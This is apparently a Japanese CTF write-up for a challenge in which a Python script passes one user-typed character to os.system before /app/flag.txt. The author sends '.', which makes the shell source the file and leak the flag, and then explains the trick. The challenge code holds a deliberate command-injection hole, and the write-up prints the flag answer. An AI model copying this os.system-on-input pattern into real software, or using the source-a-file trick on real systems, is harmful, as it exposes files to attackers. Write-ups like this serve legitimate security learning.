# 1️⃣

## / Overview

コマンド1文字でflag.txtを開く

## / Writeup

チャレンジの内容は次のようになっています。

```python
import os
os.system(f"{input("> ")[:1]} /app/flag.txt")
```

泥臭く一文字ずつ試していくことでフラグを表示させる事ができました。

```sh
$ nc 34.170.146.252 61595
> .
sh: 1: /app/flag.txt: Alpaca{builtin_builtin_builtin}: not found
```

しかし、なぜ`. /app/flag.txt`でフラグが表示されたのでしょうか。次の記事に情報がありました。

> シェルスクリプトを実行するときにピリオド（ドット）をつける理由
>
> https://www.koikikukan.com/archives/2015/10/19-003333.php

`.`には`source`コマンドと同じ機能があり、指定されたファイルの中身をシェルスクリプトとして実行しようとします。その結果、`/app/flag.txt`の1行目が読み込まれますが、`Alpaca{builtin_builtin_builtin}`というコマンドは存在しないのでエラーとして出力されました。